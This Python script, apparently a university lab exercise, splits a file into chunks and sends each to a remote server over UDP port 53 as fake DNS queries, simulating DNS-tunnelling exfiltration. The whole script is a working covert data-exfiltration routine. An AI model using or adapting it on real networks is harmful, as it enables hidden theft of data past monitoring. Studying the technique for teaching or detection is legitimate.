import os
import socket
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_file_as_dns_queries(filename, server_ip, server_port=53, max_packet_size=512):
    """
    Send a file as a series of DNS-like queries to a specified server.
    
    Args:
        filename (str): Name of the file to send.
        server_ip (str): IP address of the server to which the file will be sent.
        server_port (int, optional): Port on the server to which the file will be sent. Defaults to 53.
        max_packet_size (int, optional): Maximum size of each DNS-like packet. Defaults to 512 bytes.
    """

    # Construct the full path to the file based on the current working directory and the specified filename.
    file_path = os.path.join(os.getcwd(), 'payload', filename)

    # Open the file in binary read mode.
    with open(file_path, 'rb') as file:
        packet_number = 0  # Initialize packet number
        while True:
            # Read a chunk of the file of size 'max_packet_size' bytes.
            chunk = file.read(max_packet_size)
            # If the chunk is empty (i.e., end of file), break out of the loop.
            if not chunk:
                break

            # Increment packet number for each chunk
            packet_number += 1

            # Log the raw binary chunk.
            logging.info(f"\nSending packet {packet_number}:\n{chunk}\n")

            # Append a pseudo domain to the binary data to simulate a DNS query.
            query = f"{packet_number}:{chunk}.towson.edu"

            # Create a UDP socket.
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client_socket:
                # Send the 'query' to the specified server IP and port.
                client_socket.sendto(query.encode(), (server_ip, server_port))

                # Set a timeout for the response; if no response is received within 2 seconds, consider it a timeout.
                client_socket.settimeout(2)
                try:
                    # Wait to receive a response from the server.
                    response, _ = client_socket.recvfrom(1024)
                    # Log the response from the server.
                    logging.info(f"Response from server: {response.decode()}\n")
                except socket.timeout:
                    # If a timeout occurs, log an error message.
                    logging.error("No response received; server may be down or check network.")

if __name__ == "__main__":
    # Example usage of the function.
    send_file_as_dns_queries("image.png", "172.16.223.86")
